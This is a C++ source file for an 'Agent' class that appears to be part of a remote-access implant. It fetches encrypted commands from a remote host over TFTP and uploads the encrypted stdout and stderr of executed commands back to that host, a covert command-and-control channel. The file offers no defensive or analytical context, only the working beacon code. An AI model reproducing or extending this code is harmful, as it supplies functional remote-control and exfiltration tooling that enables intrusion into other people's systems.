#include "Agent.h"
#include "Packer.h"
#include "Transport/TFTPClient.h"

#include "easylogging++.h"
#include <format>


Agent::Agent(std::string host,  std::string encryptionKey, uint16_t port = 69)
: m_host(host), m_port(port), m_encryptionKey(encryptionKey)
{ }

std::string Agent::GetCommand()
{
    UdpSocket sock;
    TFTPClient client(&sock, m_host, m_port);
    //LOG(INFO) << std::format("Start TFTP client {}:{}", m_host.c_str(), m_port);
    
    std::vector<BYTE> command;
    TFTPClient::Status status = client.Get(command, TFTPClient::GetDownloadedDefaultFName()); 
    if(status != TFTPClient::Status::kSuccess)
        return "";

    Packer packer(m_encryptionKey);
    std::vector<BYTE> unpacked = packer.Unpack(command);
    std::ostringstream oss;
    for (auto e : unpacked){
        oss << e;
    }
    // LOG(INFO) << "Command obtained: " << oss.str();
    return oss.str();
}

bool  Agent::SendResult(CommandResult result)
{
    
    Packer packer(m_encryptionKey);
    std::string plaintext_result = "stdout:\n" + result.output +  "\nstderr:\n" + result.error;
    std::vector<BYTE> data(plaintext_result.begin(), plaintext_result.end());
    std::vector<BYTE> packed_data = packer.Pack(data);

    UdpSocket sock;
    TFTPClient client(&sock, m_host, m_port);
    TFTPClient::Status status = client.Put(packed_data, TFTPClient::GetUploadedDefaultFName());
    return (status == TFTPClient::Status::kSuccess);
}